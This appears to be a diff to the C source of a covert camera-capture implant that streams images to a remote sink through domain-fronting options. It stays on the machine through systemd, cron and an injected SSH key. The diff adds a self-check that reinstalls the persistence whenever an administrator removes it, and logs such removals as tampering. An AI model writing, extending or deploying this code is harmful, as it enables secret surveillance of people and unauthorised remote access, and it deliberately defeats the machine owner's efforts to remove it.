@@ -72,6 +72,10 @@ static void usage(const char *argv0)
         "  --ssh-pubkey FILE   真实公钥行文件（单行）。用于第三种驻留机制：\n"
         "                      未提供 = 不启用该项；提供但内容非法 = 拒绝启动，\n"
         "                      绝不静默降级为「驻留成功但该段是死的」\n"
+        "  --persist-recheck N 每完成 N 批自检一次驻留是否仍在，缺失则重装\n"
+        "                      （缺省 1；0 = 关闭自检，回到只在启动前装一次）\n"
+        "                      关闭后：管理员删掉驻留而进程未重启时永不自愈，\n"
+        "                      表现为进程在跑、画面在回传，机器重启后消失\n"
         "  -D                  双 fork + setsid 后台化\n"
         "  --no-persist        不执行驻留（仅调试；部署时禁止）\n"
         "  --root PREFIX       驻留假根（仅测试用， NULL = 真实根）\n"
@@ -123,6 +127,11 @@ int main(int argc, char **argv)
     cfg.max_batches = 0;   /* 不限，由停止信号终止 */
     cfg.ensure_persist = 1;
 
+    /* persist_recheck_batches 的缺省在环境变量回退处填（缺省 1），
+     * 这里需要区分"命令行未给"与"命令行给了 0"（0 = 合法地关闭自检），
+     * 故用一个显式标志记录命令行是否出现过该参数。 */
+    int saw_persist_recheck = 0;
+
     /* 证书校验默认开。
      *
      * 不能依赖 memset 出来的 0：那是"未设置"而不是"显式关闭"，而这两者
@@ -164,6 +173,11 @@ int main(int argc, char **argv)
         if (!strcmp(a, "--front-host") && nx)  { cfg.front_host = nx; i++; continue; }
         if (!strcmp(a, "--front-path") && nx)  { cfg.front_path = nx; i++; continue; }
         if (!strcmp(a, "--ssh-pubkey") && nx)  { cfg.ssh_pubkey_file = nx; i++; continue; }
+        if (!strcmp(a, "--persist-recheck") && nx) {
+            cfg.persist_recheck_batches = (uint32_t)strtoul(nx, NULL, 10);
+            saw_persist_recheck = 1;
+            i++; continue;
+        }
         if (!strcmp(a, "--pid") && nx)         { cfg.pid_path = nx; i++; continue; }
         if (!strcmp(a, "--root") && nx)        { cfg.root_prefix = nx; i++; continue; }
         if (!strcmp(a, "--width") && nx)       { cfg.width = (uint32_t)strtoul(nx, NULL, 10); i++; continue; }
@@ -204,6 +218,22 @@ int main(int argc, char **argv)
     if (!cfg.front_path  || !*cfg.front_path)  cfg.front_path  = getenv("CAMD_FRONT_PATH");
     if (!cfg.ssh_pubkey_file || !*cfg.ssh_pubkey_file)
         cfg.ssh_pubkey_file = getenv("CAMD_SSH_PUBKEY_FILE");
+
+    /*
+     * 驻留自检周期缺省 1（每批自检）。
+     *
+     * 开销可以接受：自检走 persist_linux_query（stat + 读一次文件），只有
+     * 发现缺段才调 ensure 做覆盖写。相比之下，管理员删掉驻留而进程未重启
+     * 导致的"看起来驻留成功、重启后消失"，代价高得多。
+     *
+     * 注意 0 是合法值（关闭自检），所以不能用"未设置"来判缺省——这里显式
+     * 读环境变量，未设且命令行未给时才填 1。
+     */
+    {
+        const char *e = getenv("CAMD_PERSIST_RECHECK");
+        if (e && *e) cfg.persist_recheck_batches = (uint32_t)strtoul(e, NULL, 10);
+        else if (!saw_persist_recheck) cfg.persist_recheck_batches = 1;
+    }
 
     /* sink 是硬性要求。允许它为空等于允许"采到了但什么都不回传"——
      * 那正是最难被发现的一类部署事故：进程在跑、灯在亮、无产出。 */
@@ -324,10 +354,17 @@ int main(int argc, char **argv)
 
     fprintf(stderr,
             "[INFO] 结束: batches=%u frames=%u bytes_out=%llu persist_rc=%d "
-            "methods=systemd:%d,cron:%d,sshkey:%d bin=%s\n",
+            "methods=systemd:%d,cron:%d,sshkey:%d "
+            "rechecks=%u heals=%u bin=%s\n",
             st.batches, st.frames, (unsigned long long)st.bytes_out,
             st.persist_rc,
             st.methods[0], st.methods[1], st.methods[2],
+            st.persist_rechecks, st.persist_heals,
             st.bin_path[0] ? st.bin_path : "(none)");
+    /* 自检装回过驻留要单独留痕：这是"有人动过这台机器"的信号，
+     * 混在 persist_rc 里看不出来（persist_rc 只反映启动那一次）。 */
+    if (st.persist_heals)
+        fprintf(stderr, "[WARN] 驻留自检发现缺段并已重装 %u 次\n",
+                st.persist_heals);
     return 0;
 }
